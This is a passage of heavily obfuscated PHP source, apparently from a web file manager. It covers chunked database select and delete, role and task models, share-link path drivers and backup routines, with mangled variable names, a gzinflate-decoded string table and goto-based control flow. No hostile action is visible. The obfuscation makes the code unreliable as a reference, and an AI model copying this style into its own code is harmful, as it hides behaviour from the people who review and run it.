substr($ÉçßÒìâ[1], 0, 1) == $–²û³©õ[462] && substr($ÉçßÒìâ[1], strlen($ÉçßÒìâ[1]) - 1, 1) == $–²û³©õ[462]) { $²ÆÕ¡‡† = !0; $ ÌØğÜ  = is_string($¯ñÑ‡À”) ? $¯ñÑ‡À” : $¦…ˆ×”; $û•–©ãâ = substr($ÉçßÒìâ[1], 1, strlen($ÉçßÒìâ[1]) - 2); $û•–©ãâ = $this->db->escapeString($û•–©ãâ); if (!strpos($ ÌØğÜ , $–²û³©õ[10])) { $ ÌØğÜ  = $–²û³©õ[463] . $ ÌØğÜ  . $–²û³©õ[463]; } $šôû›ã½ = $–²û³©õ[222] . $û•–©ãâ . $–²û³©õ[222]; $û•–©ãâ = str_replace(array($–²û³©õ[10], $–²û³©õ[464], $–²û³©õ[11]), $–²û³©õ[465], $û•–©ãâ); if ($Ó¡Ãß[$–²û³©õ[466]]) { $šôû›ã½ = $–²û³©õ[467] . $û•–©ãâ . $–²û³©õ[468]; if ($Ó¡Ãß[$–²û³©õ[469]]) { $šôû›ã½ = $–²û³©õ[468] . $û•–©ãâ . $–²û³©õ[467]; } } $Ğóºãµ[$à˜ëœ®] = $–²û³©õ[470] . $ ÌØğÜ  . $–²û³©õ[471] . $šôû›ã½ . $–²û³©õ[472]; $à˜ëœ®++; continue; } if (is_array($ÉçßÒìâ)) { $¦…ˆ×” = is_string($¯ñÑ‡À”) ? $¯ñÑ‡À” : $¦…ˆ×”; $ÉçßÒìâ = $this->parseWhereLike($ÉçßÒìâ, $¦…ˆ×”, !0, $²ÆÕ¡‡†); } if (is_numeric($¯ñÑ‡À”)) { $Ğóºãµ[$à˜ëœ®] = $ÉçßÒìâ; $à˜ëœ®++; } else { $Ğóºãµ[$¯ñÑ‡À”] = $ÉçßÒìâ; } } if ($²ÆÕ¡‡† && !$–ÃõÖıÚ) { } return $Ğóºãµ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ö€ñ–Şİ = array()) { $•ìŠËØš =& $_SERVER[†ûãı«°]; $ûú‚°¦ƒ = self::SQL_WHERE_IN_CHUNK; $ñ™”Â¸ = $this->optionsValue(); $É¹¸•®ú = $this->findWhereField($ñ™”Â¸); if (!$É¹¸•®ú || isset($ñ™”Â¸[$•ìŠËØš[369]]) || isset($ñ™”Â¸[$•ìŠËØš[430]])) { return parent::select($ö€ñ–Şİ); } $Šë«‚Ï· = $ñ™”Â¸[$•ìŠËØš[354]][$É¹¸•®ú][1]; $Šë«‚Ï· = is_array($Šë«‚Ï·) ? $Šë«‚Ï· : array(); $±»İË»µ = null; for ($£êºõ = 0; $£êºõ < count($Šë«‚Ï·); $£êºõ += $ûú‚°¦ƒ) { $İê²ş— = array_slice($Šë«‚Ï·, $£êºõ, $ûú‚°¦ƒ); if (!is_array($İê²ş—) || count($İê²ş—) == 0) { break; } $ñ™”Â¸[$•ìŠËØš[354]][$É¹¸•®ú][1] = $İê²ş—; $this->optionsValue($ñ™”Â¸); $ãï¾ÏÍ¿ = parent::select($ö€ñ–Şİ); if (!$ãï¾ÏÍ¿) { continue; } $±»İË»µ = is_array($±»İË»µ) ? $±»İË»µ : array(); $±»İË»µ = array_merge($±»İË»µ, $ãï¾ÏÍ¿); } return $±»İË»µ; } public function delete($„ùˆî™î = array()) { $–êî®ûñ =& $_SERVER[†ûãı«°]; $š½“ÛÆ£ = self::SQL_WHERE_IN_CHUNK; $›øÌ¨ë˜ = $this->optionsValue(); $–Ó¬©öÀ = $this->findWhereField($›øÌ¨ë˜); if (!$–Ó¬©öÀ) { return parent::delete($„ùˆî™î); } $¯É´Áá© = 0; $œ‡–ôöñ = $›øÌ¨ë˜[$–êî®ûñ[354]][$–Ó¬©öÀ][1]; $œ‡–ôöñ = is_array($œ‡–ôöñ) ? $œ‡–ôöñ : array(); for ($¢ŞŞ‡ë› = 0; $¢ŞŞ‡ë› < count($œ‡–ôöñ); $¢ŞŞ‡ë› += $š½“ÛÆ£) { $ëøÃ•±ù = array_slice($œ‡–ôöñ, $¢ŞŞ‡ë›, $š½“ÛÆ£); if (!is_array($ëøÃ•±ù) || count($ëøÃ•±ù) == 0) { break; } $›øÌ¨ë˜[$–êî®ûñ[354]][$–Ó¬©öÀ][1] = $ëøÃ•±ù; $this->optionsValue($›øÌ¨ë˜); $¯É´Áá© += parent::delete($„ùˆî™î); } return $¯É´Áá©; } private function findWhereField($ºë‚»ŒÇ) { $îúêÖÇĞ =& $_SERVER[†ûãı«°]; $ëÄ¤®¨ï = self::SQL_WHERE_IN_CHUNK; if (!is_array($ºë‚»ŒÇ) || !is_array($ºë‚»ŒÇ[$îúêÖÇĞ[354]])) { return !1; } foreach ($ºë‚»ŒÇ[$îúêÖÇĞ[354]] as $­‰¨î«” => $Èû­êè¡) { if (is_array($Èû­êè¡) && isset($Èû­êè¡[0]) && is_string($Èû­êè¡[0]) && strtolower($Èû­êè¡[0]) == $îúêÖÇĞ[7] && is_array($Èû­êè¡[1]) && count($Èû­êè¡[1]) > $ëÄ¤®¨ï) { ignore_timeout(); return $­‰¨î«”; } } return !1; } public function setMasterDB($ãèâ®Áê = true) { think_config($_SERVER[†ûãı«°][473], $ãèâ®Áê); } } goto fÎ„…Æ‹ë“; eÑ¬Ğô¯: $_SERVER[ÏÊŸ¾Îä] = explode($_SERVER[†ûãı«°][687], gzinflate(substr($_SERVER[†ûãı«°][688], 10, -8))); $ednmvjogtx = $_SERVER[†ûãı«°][689]; while ($ednmvjogtx < $_SERVER[†ûãı«°][690]) { if ($ednmvjogtx >= 0) { break; } $ednmvjogtx++; } goto cÙ¯©ôŸÒˆ; Fö¸¦‡³Š: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\x72\x6f\154\x65\x4c\x69\x73\x74"; public $field = array("\156\141\155\145", "\x61\165\x74\150", "\x6c\141\x62\x65\x6c", "\x64\151\163\x70\154\141\x79", "\x73\171\x73\164\x65\x6d", "\x64\x65\163\x63", "\x69\147\156\x6f\x72\145\105\170\x74", "\151\x67\156\x6f\x72\x65\x46\151\154\x65\123\x69\172\x65", "\141\x64\x6d\x69\x6e\151\163\164\x72\x61\x74\157\x72", "\x73\157\162\x74"); public function listData($õÒ÷û®å = false, $ßÑŸ³¢® = "\x73\x6f\162\x74", $ëßşÅºÄ = false) { $·‹²ˆ¬æ =& $_SERVER[†ûãı«°]; $‰Æ³·˜€ = parent::listData($õÒ÷û®å, $ßÑŸ³¢®, $ëßşÅºÄ); if (!$õÒ÷û®å) { foreach ($‰Æ³·˜€ as $÷Òó›˜ş => $·ñƒ‡›¿) { if ($·ñƒ‡›¿[$·‹²ˆ¬æ[2195]] == 1) { $‰Æ³·˜€[$÷Òó›˜ş][$·‹²ˆ¬æ[528]] = LNG($·‹²ˆ¬æ[2466]); } } } return $‰Æ³·˜€; } public function update($·ìï¡×¨, $é ìºÚã) { $ô´¹˜¤à =& $_SERVER[†ûãı«°]; $²Ê‘è — = parent::listData($·ìï¡×¨); $’…‹ªõ² = $this->findByName($é ìºÚã[$ô´¹˜¤à[32]]); if (!$²Ê‘è — || $’…‹ªõ² && $’…‹ªõ²[$ô´¹˜¤à[477]] != $²Ê‘è —[$ô´¹˜¤à[477]]) { return !1; } if ($’…‹ªõ²[$ô´¹˜¤à[2195]] == 1) { $é ìºÚã = array($ô´¹˜¤à[32] => $é ìºÚã[$ô´¹˜¤à[32]], $ô´¹˜¤à[2007] => $é ìºÚã[$ô´¹˜¤à[2007]]); } $this->filterAuth($é ìºÚã[$ô´¹˜¤à[489]]); return parent::update($·ìï¡×¨, $é ìºÚã); } public function remove($ß¯í¢•è) { $¯¥Êö½¦ = parent::listData($ß¯í¢•è); if (!$¯¥Êö½¦ || $¯¥Êö½¦[$_SERVER[†ûãı«°][191]]) { return !1; } return parent::remove($ß¯í¢•è); } public function add($™¾¨çù§) { $¤±’ãÉ =& $_SERVER[†ûãı«°]; $¦¬¾»Ë× = $™¾¨çù§[$¤±’ãÉ[32]]; if ($this->findByName($¦¬¾»Ë×)) { return !1; } $ú¹Ú™¦ñ = array($¤±’ãÉ[496] => $¦¬¾»Ë×, $¤±’ãÉ[1990] => $¤±’ãÉ[12], $¤±’ãÉ[1986] => $¤±’ãÉ[1994], $¤±’ãÉ[2467] => 1, $¤±’ãÉ[1989] => 0, $¤±’ãÉ[2468] => 0, $¤±’ãÉ[1988] => $this->getSort()); $™¾¨çù§ = array_merge($ú¹Ú™¦ñ, $™¾¨çù§); $this->filterAuth($™¾¨çù§[$¤±’ãÉ[489]]); return parent::insert($™¾¨çù§); } private function getSort() { $ê¶”—¦œ =& $_SERVER[†ûãı«°]; $ä”“¹é§ = parent::listData(); $¢ı´ëç‹ = array_to_keyvalue($ä”“¹é§, $ê¶”—¦œ[12], $ê¶”—¦œ[2008]); return empty($¢ı´ëç‹) ? 0 : max($¢ı´ëç‹) + 1; } private function filterAuth(&$›Ë†Û½‡) { $€ë”’†Û =& $_SERVER[†ûãı«°]; $‘“ÌÍĞß = array(); $ÒµÊêƒ = array_filter(explode($€ë”’†Û[50], $›Ë†Û½‡)); foreach ($ÒµÊêƒ as $›Ë†Û½‡) { $÷²ÅËŞé = explode($€ë”’†Û[10], $›Ë†Û½‡); if ($÷²ÅËŞé[0] == $€ë”’†Û[2469] && $÷²ÅËŞé[1] != $€ë”’†Û[1286]) { $ÎµóİŠœ = $÷²ÅËŞé[0] . $€ë”’†Û[10] . $÷²ÅËŞé[1] . $€ë”’†Û[2470]; if (!in_array($ÎµóİŠœ, $ÒµÊêƒ)) { $‘“ÌÍĞß[] = $ÎµóİŠœ; } } $‘“ÌÍĞß[] = $›Ë†Û½‡; } $›Ë†Û½‡ = implode($€ë”’†Û[50], $‘“ÌÍĞß); } public function findRoleDefault() { $£÷×—¬ =& $_SERVER[†ûãı«°]; $Êö£ÖÔ = parent::listData(); $†¡æ…Ñ° = !1; foreach ($Êö£ÖÔ as $³æÌşıÔ) { if (!$³æÌşıÔ || $³æÌşıÔ[$£÷×—¬[2006]] == $£÷×—¬[230] || $³æÌşıÔ[$£÷×—¬[2195]] == 1) { continue; } if (strstr($³æÌşıÔ[$£÷×—¬[489]], $£÷×—¬[2471])) { continue; } if (!strstr($³æÌşıÔ[$£÷×—¬[489]], $£÷×—¬[2472])) { continue; } if (!$†¡æ…Ñ°) { $†¡æ…Ñ° = $³æÌşıÔ; continue; } $Ÿ¥á–„Ø = explode($£÷×—¬[50], $†¡æ…Ñ°[$£÷×—¬[489]]); $ôË—Â…ş = explode($£÷×—¬[50], $³æÌşıÔ[$£÷×—¬[489]]); if (count($Ÿ¥á–„Ø) > count($ôË—Â…ş)) { $†¡æ…Ñ° = $³æÌşıÔ; } } return $†¡æ…Ñ° ? $†¡æ…Ñ°[$£÷×—¬[477]] : $£÷×—¬[12]; } public function sort($ƒª¨˜‘€, $Ùî¨¶´) { return parent::update($ƒª¨˜‘€, $Ùî¨¶´); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\56\x74\x61\x73\x6b\x4c\x69\x73\164"; public $field = array("\x6e\141\x6d\145", "\164\x79\x70\145", "\145\166\x65\x6e\164", "\164\x69\x6d\145", "\x64\x65\x73\143", "\x73\171\x73\164\x65\155", "\x65\156\141\142\x6c\145", "\x6c\141\x73\164\x52\165\156", "\x73\x6f\x72\x74"); public function listData($ˆ‡Ş¸ûÎ = false, $¸–ÇŸª = "\x73\x6f\x72\x74", $¯ê£¢àŸ = false) { return parent::listData($ˆ‡Ş¸ûÎ, $¸–ÇŸª, $¯ê£¢àŸ); } public function add($»¢íÀ¸ù) { $Æöî»Ø´ =& $_SERVER[†ûãı«°]; $ÍÙíÓø„ = $this->findByName($»¢íÀ¸ù[$Æöî»Ø´[32]]); if ($ÍÙíÓø„) { return !1; } $»¢íÀ¸ù[$Æöî»Ø´[1733]] = 0; $»¢íÀ¸ù[$Æöî»Ø´[2008]] = $this->getSort(); return parent::insert($»¢íÀ¸ù); } private function getSort() { $«‚Ç“Ôº =& $_SERVER[†ûãı«°]; $ì¢šéá = parent::listData(); $©åÂ‹ëÊ = array_to_keyvalue($ì¢šéá, $«‚Ç“Ôº[12], $«‚Ç“Ôº[2008]); return empty($©åÂ‹ëÊ) ? 0 : max($©åÂ‹ëÊ) + 1; } public function update($ÊúûäÒ, $úï–Ç¡ˆ) { $Àš¯àÙâ =& $_SERVER[†ûãı«°]; $¯õ›Ú×£ = $this->listData($ÊúûäÒ); $ıéÂãò‰ = $this->findByName($úï–Ç¡ˆ[$Àš¯àÙâ[32]]); if (!$¯õ›Ú×£ || $ıéÂãò‰ && $ıéÂãò‰[$Àš¯àÙâ[477]] != $¯õ›Ú×£[$Àš¯àÙâ[477]]) { return !1; } return parent::update($ÊúûäÒ, $úï–Ç¡ˆ); } public function remove($¨­‡Şƒ€, $ñó»¤µŸ = false) { $Ë£Å’³ =& $_SERVER[†ûãı«°]; $ûÀßË¬Î = $this->listData($¨­‡Şƒ€); if (!$ûÀßË¬Î) { return; } if (!$ñó»¤µŸ && $ûÀßË¬Î[$Ë£Å’³[191]] == $Ë£Å’³[91]) { return !1; } return parent::remove($¨­‡Şƒ€); } public function enable($ÇçêÛ»•, $¤ÊĞ£Š¨) { return $this->update($ÇçêÛ»•, array($_SERVER[†ûãı«°][2461] => $¤ÊĞ£Š¨)); } public function run($ñ­ÌÜŸ) { return $this->update($ñ­ÌÜŸ, array($_SERVER[†ûãı«°][2473] => time())); } } goto dàÌ×¶†™; bÎİ‡çõî: class PathDriverDbShareLink extends PathDriverDB { public function __construct($îÜ…íùÌ) { $this->pathParse = $îÜ…íùÌ; $this->model = Model($_SERVER[†ûãı«°][1432]); } protected function infoParse($Àşğ§¯á, $¤·Î©ä» = false, $ôÃç€¦á = false) { $åô±Ğ­™ =& $_SERVER[†ûãı«°]; return Action($åô±Ğ­™[1267])->sharePathInfo($this->pathParse[$åô±Ğ­™[87]], !0, $¤·Î©ä»); } public function listPath($¤óË¶Õœ, $ùËßü»î = false) { $¢‰¥Şç =& $_SERVER[†ûãı«°]; $¢ˆ¶óşÀ = parent::listPath($¤óË¶Õœ, $ùËßü»î); if (!$¢ˆ¶óşÀ) { return $¢ˆ¶óşÀ; } if (is_array($¢ˆ¶óşÀ[$¢‰¥Şç[1440]])) { $¢ˆ¶óşÀ[$¢‰¥Şç[1440]] = Action($¢‰¥Şç[1267])->shareItemInfo($¢ˆ¶óşÀ[$¢‰¥Şç[1440]]); } foreach ($¢ˆ¶óşÀ as $¿Íğ …½ => $üò¹¨£¨) { if (!in_array($¿Íğ …½, array($¢‰¥Şç[86], $¢‰¥Şç[85]))) { continue; } foreach ($üò¹¨£¨ as $šàƒ‡ù¿ => $ê³Æ»¹â) { $¢ˆ¶óşÀ[$¿Íğ …½][$šàƒ‡ù¿] = Action($¢‰¥Şç[1267])->shareItemInfo($ê³Æ»¹â); } } return $¢ˆ¶óşÀ; } public function listAll($Ê¢»Ì¹¼) { $¯˜°‡·ã =& $_SERVER[†ûãı«°]; $ƒÙŒı¨ã = IO::info($this->pathParse[$¯˜°‡·ã[87]]); if (!$ƒÙŒı¨ã) { return array(); } $Íâ¥Ñ” = $this->model->listAll($Ê¢»Ì¹¼); foreach ($Íâ¥Ñ” as &$ñ’¨äÂ“) { $ñ’¨äÂ“[$¯˜°‡·ã[90]] = Action($¯˜°‡·ã[1267])->shareItemInfo($ñ’¨äÂ“[$¯˜°‡·ã[90]]); } unset($ñ’¨äÂ“); return $Íâ¥Ñ”; } } class PathDriverDriverShareItem { public function __construct($ŠÏ…æı) { $this->pathParse = $ŠÏ…æı; } public function __call($«§’ÌÔã, $Ü©ÇèÜí) { $ä®Á»Àß =& $_SERVER[†ûãı«°]; if (method_exists($this, $«§’ÌÔã)) { return; } $å÷¬¤ï = call_user_func_array(array($ä®Á»Àß[1441], $«§’ÌÔã), $Ü©ÇèÜí); $¼ı¯ª— = array($ä®Á»Àß[1442], $ä®Á»Àß[1443], $ä®Á»Àß[1444], $ä®Á»Àß[1445], $ä®Á»Àß[625], $ä®Á»Àß[627], $ä®Á»Àß[1446], $ä®Á»Àß[110], $ä®Á»Àß[1447], $ä®Á»Àß[1448]); if (in_array($«§’ÌÔã, $¼ı¯ª—)) { $å÷¬¤ï = $this->getPathOuter($å÷¬¤ï); } return $å÷¬¤ï; } public function copy($ÓàËÇŒÖ, $‹³¶ûö«, $‘Õ‘ùÑç = false, $ÍŠ½‰ÜŒ = false) { return $this->copyMove($ÓàËÇŒÖ, $‹³¶ûö«, $‘Õ‘ùÑç, $_SERVER[†ûãı«°][625], $ÍŠ½‰ÜŒ); } public function move($’Íªà¯, $ğêÄ©â, $¾ºô‡·Ö = false, $©ï÷÷ÔÀ = false) { return $this->copyMove($’Íªà¯, $ğêÄ©â, $¾ºô‡·Ö, $_SERVER[†ûãı«°][627], $©ï÷÷ÔÀ); } private function copyMove($åÌ¡úš, $ÎÁÅ»”ñ, $ñó‰¢¸õ, $¢¼«œø, $³ëÈğ¥ = false) { $¬ÇÎ‡‚ =& $_SERVER[†ûãı«°]; $ÅŞ—ÆÆ¯ = $ÎÁÅ»”ñ; $Î†“ÁîÖ = IO::driverMake($ÎÁÅ»”ñ); if ($Î†“ÁîÖ->pathParse[$¬ÇÎ‡‚[1243]]) { $ÎÁÅ»”ñ = $Î†“ÁîÖ->pathParse[$¬ÇÎ‡‚[1243]]; } else { $ÎÁÅ»”ñ = $ÅŞ—ÆÆ¯; } $ÜÕè ÔÊ = IO::copyMove($åÌ¡úš, $ÎÁÅ»”ñ, $ñó‰¢¸õ, $¢¼«œø, $³ëÈğ¥); $ÜÕè ÔÊ = $this->getPathOuter($ÜÕè ÔÊ); return $ÜÕè ÔÊ; } public function pathThis($ šŞŞÓ­) { return get_path_this($this->pathParse[$_SERVER[†ûãı«°][87]]); } public function pathFather($ÌÈ¹º®À) { return get_path_father($this->pathParse[$_SERVER[†ûãı«°][87]]); } public function iconvSystem($ËÅ‚÷å) { return $ËÅ‚÷å; } protected function infoParse($²›¤ÜÜ, $ÜèˆÃ©Ò = false) { $•ãËø¿ö =& $_SERVER[†ûãı«°]; $º“‘°Á¦ = $this->pathParse[$•ãËø¿ö[564]][$•ãËø¿ö[1268]] . $this->pathParse[$•ãËø¿ö[1261]]; if ($ÜèˆÃ©Ò) { $Ï•Æ½„œ = IO::infoWithChildren($º“‘°Á¦); } else { $Ï•Æ½„œ = IO::info($º“‘°Á¦); } $ØÅúĞˆà = $this->pathParse[$•ãËø¿ö[564]]; return Action($•ãËø¿ö[1439])->_shareItemeParse($Ï•Æ½„œ, $ØÅúĞˆà); } public function listAll($ÄûØÔêû) { $¾µâØİ´ =& $_SERVER[†ûãı«°]; $¶©—Ã™ì = IO::listAll($ÄûØÔêû); $—Ïû¼Ø´ = rtrim($this->pathParse[$¾µâØİ´[564]][$¾µâØİ´[1268]], $¾µâØİ´[8]); foreach ($¶©—Ã™ì as &$»“ıÚö³) { $»“ıÚö³[$¾µâØİ´[87]] = $this->pathDriver . $¾µâØİ´[8] . ltrim(substr($»“ıÚö³[$¾µâØİ´[87]], strlen($—Ïû¼Ø´)), $¾µâØİ´[8]); } unset($»“ıÚö³); return $¶©—Ã™ì; } public function listAllSimple($ƒş­£´, $¦Ô¬ÊÀ‡ = false) { $ãà©Ãï =& $_SERVER[†ûãı«°]; $÷ïŸÎ€ = $this->listAll($ƒş­£´); $Áß±äĞË = $this->pathParse[$ãà©Ãï[497]]; if (trim($Áß±äĞË, $ãà©Ãï[8]) == trim(get_path_father($Áß±äĞË), $ãà©Ãï[8])) { $¦Ô¬ÊÀ‡ = !0; } return IO::init($ãà©Ãï[12])->listAllSimpleMake($÷ïŸÎ€, $Áß±äĞË, $¦Ô¬ÊÀ‡); } public function getPathOuter($ãÊ‹«¨Ë) { $å˜ÌÎç =& $_SERVER[†ûãı«°]; $¦¨ˆ¶¦ª = KodIO::parse($ãÊ‹«¨Ë); if ($¦¨ˆ¶¦ª[$å˜ÌÎç[33]] == KodIO::KOD_SHARE_ITEM) { return $¦¨ˆ¶¦ª[$å˜ÌÎç[87]]; } $‹Ö§ò = KodIO::clear($ãÊ‹«¨Ë); $®š¼÷Ã = KodIO::clear($this->pathParse[$å˜ÌÎç[564]][$å˜ÌÎç[1268]]); $ËÅĞ‹÷ = substr($‹Ö§ò, strlen($®š¼÷Ã)); if (substr($‹Ö§ò, 0, strlen($®š¼÷Ã)) != $®š¼÷Ã) { return !1; } return $this->pathParse[$å˜ÌÎç[1262]] . $å˜ÌÎç[8] . ltrim($ËÅĞ‹÷, $å˜ÌÎç[8]); } public function getType() { $İÛóÁ†í =& $_SERVER[†ûãı«°]; $È¹ä‘©Ü = str_replace($İÛóÁ†í[77], $İÛóÁ†í[12], get_class($this)); return strtolower($È¹ä‘©Ü); } public function isOsDriver($·´Õ±íø) { return IO::isOsDriver($·´Õ±íø); } public function info($¢Ì’ÅË) { return $this->infoParse($¢Ì’ÅË); } public function infoAuth($®…ı…”±) { return $this->infoParse($®…ı…”±); } public function infoWithChildren($æÇı¨¼Ï) { return $this->infoParse($æÇı¨¼Ï, !0); } public function infoFull($ò–¾‡Êü) { return $this->infoParse($ò–¾‡Êü); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Œ”èßø¥) { $this->pathParse = $Œ”èßø¥; } protected function infoParse($„ç’ßÃö, $³­×çœ = false) { $ÅÑØç¯ë =& $_SERVER[†ûãı«°]; return Action($ÅÑØç¯ë[1267])->sharePathInfo($this->pathParse[$ÅÑØç¯ë[87]], !0, $³­×çœ); } public function listPath($’İúÅ•ƒ, $‰¬öË£Ú = false) { $æ¦Í†üÌ =& $_SERVER[†ûãı«°]; $¾Êˆ™èÂ = IO::listPath($’İúÅ•ƒ, $‰¬öË£Ú); if (!$¾Êˆ™èÂ) { return $¾Êˆ™èÂ; } if (is_array($¾Êˆ™èÂ[$æ¦Í†üÌ[1440]])) { $É¢‘ªúø = Action($æ¦Í†üÌ[1449])->parsePathChildren($¾Êˆ™èÂ[$æ¦Í†üÌ[1440]], array($æ¦Í†üÌ[497] => $’İúÅ•ƒ)); $¾Êˆ™èÂ[$æ¦Í†üÌ[1440]] = Action($æ¦Í†üÌ[1267])->shareItemInfo($É¢‘ªúø); } foreach ($¾Êˆ™èÂ as $³‰¢šá€ => $øîÙÆìµ) { if (!in_array($³‰¢šá€, array($æ¦Í†üÌ[86], $æ¦Í†üÌ[85]))) { continue; } foreach ($øîÙÆìµ as $ÏÈÎÏ­“ => $É¢‘ªúø) { $É¢‘ªúø = Action($æ¦Í†üÌ[1449])->parsePathChildren($É¢‘ªúø, array($æ¦Í†üÌ[497] => $’İúÅ•ƒ)); $¾Êˆ™èÂ[$³‰¢šá€][$ÏÈÎÏ­“] = Action($æ¦Í†üÌ[1267])->shareItemInfo($É¢‘ªúø); } } return $¾Êˆ™èÂ; } } goto dÒÌ‡°Şİ©; FµÕ…¦ÒËŒ: class BackupDbFile { public function __construct() { } public function index() { $ÙùÚÊ¨À =& $_SERVER[†ûãı«°]; $ø›¢éáî = Backup::get(); $„ªú×Ô = $ø›¢éáî[$ÙùÚÊ¨À[32]]; $©èƒ¢¤ = $this->tmpFilesPath() . "\x62\141\x63\153\x75\160\x5f{$„ªú×Ô}\x2f"; $ÉõÏş‘ = $this->backupPath($ø›¢éáî); if (!($ÉõÏş‘ = IO::mkdir($ÉõÏş‘))) { Backup::log($ÙùÚÊ¨À[876] . $ÉõÏş‘); return !1; } $Ã°§ÌÙ² = IO::listPath($©èƒ¢¤); $‘‚ó£ = isset($Ã°§ÌÙ²[$ÙùÚÊ¨À[86]]) ? $Ã°§ÌÙ²[$ÙùÚÊ¨À[86]] : array(); $óá’¹ÏÑ = array_sum(array_column($‘‚ó£, $ÙùÚÊ¨À[79])); if (!$óá’¹ÏÑ) { Backup::log($ÙùÚÊ¨À[877] . $©èƒ¢¤); return !1; } $»ÔŠ¯ã· = array($ÙùÚÊ¨À[878] => $óá’¹ÏÑ, $ÙùÚÊ¨À[879] => time()); Backup::set($»ÔŠ¯ã·); $¹–ñÂÍë = new TaskFileTransfer($ÙùÚÊ¨À[880], $ÙùÚÊ¨À[853], count($‘‚ó£), LNG($ÙùÚÊ¨À[862]) . $ÙùÚÊ¨À[464] . LNG($ÙùÚÊ¨À[864]) . $ÙùÚÊ¨À[881]); $¹–ñÂÍë->task[$ÙùÚÊ¨À[839]] = $óá’¹ÏÑ; foreach ($Ã°§ÌÙ²[$ÙùÚÊ¨À[86]] as $›ÓßáÈ) { $Ü¬Ú¯‚ = IO::move($›ÓßáÈ[$ÙùÚÊ¨À[87]], $ÉõÏş‘); if (!$Ü¬Ú¯‚) { $¹–ñÂÍë->end(); $Œšä‘Ü© = IO::getLastError($ÙùÚÊ¨À[882] . $›ÓßáÈ[$ÙùÚÊ¨À[87]] . $ÙùÚÊ¨À[883] . $ÉõÏş‘ . $ÙùÚÊ¨À[178]); Backup::log($Œšä‘Ü©); return !1; } } $ÌÅÕÆµ = new DbManage(); $Ñ¦Æè = $ÌÅÕÆµ->getSqlFile(); if (!$Ñ¦Æè[$ÙùÚÊ¨À[884]] || !$Ñ¦Æè[$ÙùÚÊ¨À[13]]) { Backup::log($ÙùÚÊ¨À[885]); return !1; } IO::move($Ñ¦Æè[$ÙùÚÊ¨À[884]], $ÉõÏş‘); IO::move($Ñ¦Æè[$ÙùÚÊ¨À[13]], $ÉõÏş‘); $¹–ñÂÍë->end(); $»ÔŠ¯ã· = array($ÙùÚÊ¨À[886] => $óá’¹ÏÑ, $ÙùÚÊ¨À[887] => time()); Backup::set($»ÔŠ¯ã·); return !0; } private function backupPath($ÇùÏ‚°ö) { $ûü›ĞÙª =& $_SERVER[†ûãı«°]; $Â±ß¨Ø = $ÇùÏ‚°ö[$ûü›ĞÙª[32]]; $‡ì­Ÿ£… = Model($ûü›ĞÙª[846])->get($ûü›ĞÙª[847]); $ŠîÉãíÓ = substr(md5($ûü›ĞÙª[848] . $‡ì­Ÿ£… . $Â±ß¨Ø), 0, 8); return "\173\151\157\72{$ÇùÏ‚°ö[$ûü›ĞÙª[828]]}\175\x2f\144\141\x74\x61\x62\x61\163\145\57\x62\x61\143\x6b\165\x70\57" . $Â±ß¨Ø . $ûü›ĞÙª[11] . $ŠîÉãíÓ; } private function tmpFilesPath() { $Çİ„Î¤ =& $_SERVER[†ûãı«°]; $ÍøÁŞ£É = TEMP_FILES; if ($GLOBALS[$Çİ„Î¤[6]][$Çİ„Î¤[92]][$Çİ„Î¤[874]]) { $ÍøÁŞ£É = $GLOBALS[$Çİ„Î¤[6]][$Çİ„Î¤[92]][$Çİ„Î¤[874]]; if (!mk_dir($ÍøÁŞ£É) || !is_writable($ÍøÁŞ£É) || !IO::mkfile($ÍøÁŞ£É . $Çİ„Î¤[875])) { $ÍøÁŞ£É = TEMP_FILES; } } return $ÍøÁŞ£É; } } class BackupFile { public function __construct() { } public function index() { $Ï»ºÉÀ— = Backup::get(); $Ü¦ˆáéË = $Ï»ºÉÀ—[$_SERVER[†ûãı«°][370]][$_SERVER[†ûãı«°][232]][$_SERVER[†ûãı«°][545]]; $å·›€Å = array($_SERVER[†ûãı«°][546] => array($_SERVER[†ûãı«°][888], $Ü¦ˆáéË), $_SERVER[†ûãı«°][889] => array($_SERVER[†ûãı«°][408], $Ï»ºÉÀ—[$_SERVER[†ûãı«°][828]])); $¨¦ÓÈó = (int) Model($_SERVER[†ûãı«°][867])->where($å·›€Å)->count($_SERVER[†ûãı«°][545]); $©„ıîşÀ = (int) Model($_SERVER[†ûãı«°][867])->where($å·›€Å)->sum($_SERVER[†ûãı«°][79]); $«Šô‘ î = new TaskFileTransfer($_SERVER[†ûãı«°][890], $_SERVER[†ûãı«°][853], $¨¦ÓÈó, LNG($_SERVER[†ûãı«°][862]) . $_SERVER[†ûãı«°][863] . LNG($_SERVER[†ûãı«°][891])); $«Šô‘ î->task[$_SERVER[†ûãı«°][839]] = $©„ıîşÀ; $±ÓÜ¥ˆ = array($_SERVER[†ûãı«°][892] => $¨¦ÓÈó, $_SERVER[†ûãı«°][893] => $©„ıîşÀ, $_SERVER[†ûãı«°][894] => time()); Backup::set($±ÓÜ¥ˆ); $Úş‡»¹ê = !0; $ÀûÁ©Åú = $this->storeIds(); $ò‰åíÊ° = 1; $…¢¹÷°Í = 1000; $öêíœÄß = $ˆ¨ÕƒÜÉ = 0; $Ç´‚¨ÃÚ = array(); $ŞÕı–± = $„ƒ¥ ÌÏ = 0; do { $‡ßóÂ = $_SERVER[†ûãı«°][895]; $ø›Öó¿é = Model($_SERVER[†ûãı«°][867])->where($å·›€Å)->field($‡ßóÂ)->order($_SERVER[†ûãı«°][896])->selectPage($…¢¹÷°Í, $ò‰åíÊ°); $Â ©‰± = !empty($ø›Öó¿é[$_SERVER[†ûãı«°][447]]) ? $ø›Öó¿é[$_SERVER[†ûãı«°][447]] : array(); foreach ($Â ©‰± as $‡²ï™û) { if (!$this->_fileExist($‡²ï™û, $Ç´‚¨ÃÚ, $ÀûÁ©Åú)) { Backup::log($_SERVER[†ûãı«°][897] . $‡²ï™û[$_SERVER[†ûãı«°][545]] . $_SERVER[†ûãı«°][898] . $‡²ï™û[$_SERVER[†ûãı«°][87]]); continue; } $±µÔšÂõ = $‡²ï™û[$_SERVER[†ûãı«°][87]]; $ìÉ›œ® = 